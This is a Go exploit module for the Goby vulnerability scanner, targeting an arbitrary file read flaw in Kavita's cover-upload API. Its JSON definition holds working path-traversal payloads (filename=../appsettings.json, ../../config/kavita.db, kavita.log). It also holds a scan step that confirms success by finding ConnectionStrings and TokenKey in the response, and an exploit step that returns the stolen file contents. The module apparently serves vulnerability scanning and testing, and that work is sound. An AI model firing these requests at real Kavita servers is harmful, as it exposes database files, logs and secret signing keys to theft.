package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Kavita cover-upload Arbitrary File Read",
    "Description": "<p>Kavita is a fast, feature-rich cross-platform reading server. With a focus on comics, the goal is to be a complete solution for all your reading needs.</p><p>Kavita has security vulnerabilities. Attackers can use the filename parameter to read and download sensitive information such as appsettings.json, kavita.db, and kavita.log.</p>",
    "Product": "Kavita",
    "Homepage": "https://github.com/Kareadita/Kavita",
    "DisclosureDate": "2022-08-09",
    "Author": "abszse",
    "FofaQuery": "title=\"Kavita\"",
    "GobyQuery": "title=\"Kavita\"",
    "Level": "2",
    "Impact": "<p>Kavita has security vulnerabilities. Attackers can use the filename parameter to read and download sensitive information such as appsettings.json, kavita.db, and kavita.log.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://github.com/Kareadita/Kavita\">https://github.com/Kareadita/Kavita</a></p>",
    "References": [
        "https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "createSelect",
            "value": "../appsettings.json,../../config//logs/kavita.log,../../config/kavita.db",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/image/cover-upload?filename=../appsettings.json",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"ConnectionStrings\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "TokenKey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/image/cover-upload?filename={{{cmd}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Kavita cover-upload 任意文件读取漏洞",
            "Product": "Kavita",
            "Description": "<p>Kavita 是一个快速、功能丰富的跨平台阅读服务器。以漫画为重点，目标是成为满足您所有阅读需求的完整解决方案。<br></p><p>Kavita 存在安全漏洞，攻击者可利用filename参数读取下载appsettings.json、kavita.db、kavita.log等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注官网更新：<a href=\"https://github.com/Kareadita/Kavita\">https://github.com/Kareadita/Kavita</a><br></p>",
            "Impact": "<p>Kavita 存在安全漏洞，攻击者可利用filename参数读取下载appsettings.json、kavita.db、kavita.log等敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Kavita cover-upload Arbitrary File Read",
            "Product": "Kavita",
            "Description": "<p>Kavita is a fast, feature-rich cross-platform reading server. With a focus on comics, the goal is to be a complete solution for all your reading needs.<br></p><p>Kavita has security vulnerabilities. Attackers can use the filename parameter to read and download sensitive information such as appsettings.json, kavita.db, and kavita.log.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://github.com/Kareadita/Kavita\">https://github.com/Kareadita/Kavita</a><br></p>",
            "Impact": "<p>Kavita has security vulnerabilities. Attackers can use the filename parameter to read and download sensitive information such as appsettings.json, kavita.db, and kavita.log.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}